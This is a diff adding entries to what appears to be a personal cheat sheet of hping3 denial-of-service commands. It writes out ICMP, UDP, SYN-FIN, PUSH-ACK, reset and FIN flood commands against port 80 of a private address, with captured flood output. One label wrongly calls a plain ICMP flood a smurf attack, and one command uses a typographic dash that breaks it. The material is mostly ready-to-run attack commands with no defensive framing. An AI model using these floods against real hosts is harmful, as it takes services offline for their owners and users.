@@ -61,6 +61,32 @@ hping in flood mode, no replies will be shown
 1052409 packets transmitted, 0 packets received, 100% packet loss
 round-trip min/avg/max = 0.0/0.0/0.0 ms
 
+#Perform Smurf Attack
+root#hping3 --icmp --flood 10.239.184.1
+HPING 10.239.184.1 (eth0 10.239.184.1): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 10.239.184.1 hping statistic ---
+4059603 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+#Perform DOS  Attack to a port
+hping3 -F --flood -p 80 10.239.184.1
+
+#Perform UDP DOS  Attack to a port
+hping3 --udp -F --flood -p 80 10.239.184.1
+
+#Perform SYN FIN Flood
+hping3 -SF --flood -p 80 10.239.184.1
+
+#PUSH ACK Flood
+hping3 -PA --flood -p 80 <>
+
+#Reset Flood
+hping3 -R --flood -p 80 <>
+
+#FIN Flood
+hping3 -F –flood -p 80 <>
 
 
 
